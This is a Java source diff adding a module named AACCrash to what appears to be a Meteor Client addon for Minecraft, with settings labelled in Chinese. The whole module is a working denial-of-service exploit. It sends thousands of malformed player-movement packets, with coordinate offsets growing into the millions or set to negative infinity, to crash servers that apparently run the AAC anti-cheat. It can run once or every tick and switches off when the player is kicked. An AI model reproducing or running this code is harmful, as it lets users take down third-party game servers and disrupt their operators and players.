@@ -1,0 +1,97 @@
+package widecat.meteorcrashaddon.modules;
+
+import meteordevelopment.meteorclient.events.game.GameLeftEvent;
+import meteordevelopment.meteorclient.events.world.TickEvent;
+import meteordevelopment.meteorclient.settings.*;
+import meteordevelopment.meteorclient.systems.modules.Module;
+import meteordevelopment.meteorclient.utils.Utils;
+import meteordevelopment.orbit.EventHandler;
+import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
+import widecat.meteorcrashaddon.CrashAddon;
+
+public class AACCrash extends Module {
+    private final SettingGroup sgGeneral = settings.getDefaultGroup();
+
+    private final Setting<Modes> crashMode = sgGeneral.add(new EnumSetting.Builder<Modes>()
+        .name("模式")
+        .description("使用哪种崩溃模式")
+        .defaultValue(Modes.NEW)
+        .build());
+
+    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
+        .name("发包数量")
+        .description("向服务器发送多少个数据包")
+        .defaultValue(5000)
+        .sliderRange(100, 10000)
+        .build());
+
+    private final Setting<Boolean> onTick = sgGeneral.add(new BoolSetting.Builder()
+        .name("一刻度")
+        .description("每个刻度发送数据包")
+        .defaultValue(false)
+        .build());
+
+    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
+        .name("踢出关闭")
+        .description("在被踢出时禁用模块")
+        .defaultValue(true)
+        .build());
+
+    public AACCrash() {
+        super(CrashAddon.CATEGORY, "AAC崩溃", "假定使用AAC的服务器的崩溃方法");
+    }
+
+    @Override
+    public void onActivate() {
+        if (Utils.canUpdate() && !onTick.get()) {
+            switch (crashMode.get()) {
+                case NEW -> {
+                    for (double i = 0; i < amount.get(); i++) {
+                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (9412 * i), mc.player.getY() + (9412 * i), mc.player.getZ() + (9412 * i), true));
+                    }
+                }
+                case OTHER -> {
+                    for (double i = 0; i < amount.get(); i++) {
+                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (500000 * i), mc.player.getY() + (500000 * i), mc.player.getZ() + (500000 * i), true));
+                    }
+                }
+                case OLD -> mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
+            }
+            if (autoDisable.get()) toggle();
+        }
+    }
+
+    @EventHandler
+    public void onTick(TickEvent.Pre tickEvent) {
+        if (onTick.get()) {
+            switch (crashMode.get()) {
+                case NEW -> {
+                    for (double i = 0; i < amount.get(); i++) {
+                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (9412 * i), mc.player.getY() + (9412 * i), mc.player.getZ() + (9412 * i), true));
+                    }
+                }
+                case OTHER -> {
+                    for (double i = 0; i < amount.get(); i++) {
+                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (500000 * i), mc.player.getY() + (500000 * i), mc.player.getZ() + (500000 * i), true));
+                    }
+                }
+                case OLD -> {
+                    for (double i = 0; i < amount.get(); i++) {
+                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
+                    }
+                }
+            }
+        }
+    }
+
+    @EventHandler
+    private void onGameLeft(GameLeftEvent event) {
+        if (autoDisable.get()) toggle();
+    }
+
+    public enum Modes {
+        NEW,
+        OTHER,
+        OLD
+    }
+}
